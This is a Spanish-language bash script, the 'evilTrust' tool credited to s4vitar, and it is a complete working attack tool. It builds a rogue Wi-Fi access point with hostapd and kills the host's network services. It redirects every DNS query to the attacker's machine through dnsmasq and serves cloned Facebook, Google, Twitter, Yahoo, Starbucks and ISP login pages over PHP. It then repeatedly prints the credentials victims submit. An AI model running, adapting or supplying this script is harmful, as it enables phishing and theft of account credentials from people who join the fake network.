#!/bin/bash

# evilTrust v1.0, Author @s4vitar (Marcelo Vázquez)

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
	rm dnsmasq.conf hostapd.conf 2>/dev/null
	rm -r *.php *.js *.txt *.ep assets portal_2fa Roboto-Regular.ttf 2>/dev/null
	ifconfig wlan0mon down; sleep 1
	iwconfig wlan0mon mode monitor; sleep 1
	ifconfig wlan0mon up; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
	tput cnorm
	exit
}

function banner(){
echo -e "\n${redColour}╱╱╱╱╱╱╱╭┳━━━━╮╱╱╱╱╱╱╭╮"
sleep 0.05
echo -e "╱╱╱╱╱╱╱┃┃╭╮╭╮┃╱╱╱╱╱╭╯╰╮"
sleep 0.05
echo -e "╭━━┳╮╭┳┫┣╯┃┃┣┻┳╮╭┳━┻╮╭╯"
sleep 0.05
echo -e "┃┃━┫╰╯┣┫┃╱┃┃┃╭┫┃┃┃━━┫┃   ${endColour}${yellowColour}(${endColour}${grayColour}Hecho por ${endColour}${blueColour}s4vitar${endColour}${yellowColour})${endColour}${redColour}"
sleep 0.05
echo -e "┃┃━╋╮╭┫┃╰╮┃┃┃┃┃╰╯┣━━┃╰╮"
sleep 0.05
echo -e "╰━━╯╰╯╰┻━╯╰╯╰╯╰━━┻━━┻━╯${endColour}"
sleep 0.05
}

function dependencies(){
	sleep 1.5; counter=0
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...\n"
	sleep 1

	if [ "$(command -v php)" ]; then
		echo -e ". . . . . . . . ${blueColour}[V]${endColour}${grayColour} La herramienta${endColour}${yellowColour} php${endColour}${grayColour} se encuentra instalada"
		let counter+=1
	else
		echo -e "\t${redColour}[X]${endColour}${grayColour} La herramienta${endColour}${yellowColour} php${endColour}${grayColour} no se encuentra instalada"
	fi; sleep 0.4

        if [ "$(command -v dnsmasq)" ]; then
                echo -e ". . . . . . . . ${blueColour}[V]${endColour}${grayColour} La herramienta${endColour}${yellowColour} dnsmasq${endColour}${grayColour} se encuentra instalada"
                let counter+=1
        else
                echo -e "\t${redColour}[X]${endColour}${grayColour} La herramienta${endColour}${yellowColour} dnsmasq${endColour}${grayColour} no se encuentra instalada"
        fi; sleep 0.4

        if [ "$(command -v hostapd)" ]; then
                echo -e ". . . . . . . . ${blueColour}[V]${endColour}${grayColour} La herramienta${endColour}${yellowColour} hostapd${endColour}${grayColour} se encuentra instalada"
                let counter+=1
        else
                echo -e "\t${redColour}[X]${endColour}${grayColour} La herramienta${endColour}${yellowColour} hostapd${endColour}${grayColour} no se encuentra instalada"
        fi; sleep 1

	if [ "$(echo $counter)" == "3" ]; then
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comenzando...\n"
		sleep 3
	else
		echo -e "\n${redColour}[!]${endColour}${grayColour} Es necesario contar con las herramientas php, dnsmasq y hostapd instaladas para ejecutar este script${endColour}\n"
		exit
	fi
}

function getCredentials(){

	while true; do
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
		sleep 1
		cat datos-privados.txt portal_2fa/datos-privados.txt 2>/dev/null
		sleep 3; clear
	done
}

function startAttack(){
	clear; if [[ -e credenciales.txt ]]; then
		rm -rf credenciales.txt
	fi

	echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Listando interfaces de red disponibles...${endColour}"; sleep 1

	# Si la interfaz posee otro nombre, cambiarlo en este punto (consideramos que se llama wlan0 por defecto)
	airmon-ng start wlan0 > /dev/null 2>&1; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
	counter=1
	for interface in $(cat iface); do
		echo -e "\t\n${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}"; sleep 0.26
		let counter++
	done; tput cnorm && echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0mon): ${endColour}" && read choosed_interface

	rm iface 2>/dev/null
	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (Ej: wifiGratis):${endColour} " && read -r use_ssid
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
	echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n"
	sleep 2
	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
	sleep 5

	echo -e "interface=$choosed_interface\n" > hostapd.conf
	echo -e "driver=nl80211\n" >> hostapd.conf
	echo -e "ssid=$use_ssid\n" >> hostapd.conf
	echo -e "hw_mode=g\n" >> hostapd.conf
	echo -e "channel=$use_channel\n" >> hostapd.conf
	echo -e "macaddr_acl=0\n" >> hostapd.conf
	echo -e "auth_algs=1\n" >> hostapd.conf
	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf

	echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando interfaz $choosed_interface${endColour}\n"
	sleep 2
	echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
	hostapd hostapd.conf > /dev/null 2>&1 &
	sleep 6

	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}"
	echo -e "interface=$choosed_interface\n" > dnsmasq.conf
	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
	echo -e "server=8.8.8.8\n" >> dnsmasq.conf
	echo -e "log-queries\n" >> dnsmasq.conf
	echo -e "log-dhcp\n" >> dnsmasq.conf
	echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
	echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf

	ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
	sleep 1
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	sleep 1
	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
	sleep 5

	tput cnorm; echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, optimumwifi):${endColour} " && read template
	tput civis; cp -r $template/* .
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
	php -S 192.168.1.1:80 > /dev/null 2>&1 &
	sleep 2
	getCredentials
}

# Main Program

if [ "$(id -u)" == "0" ]; then
	tput civis; banner
	dependencies
	startAttack
else
	echo -e "\n${redColour}[!] Es necesario ser root para ejecutar la herramienta${endColour}"
	exit 1
fi
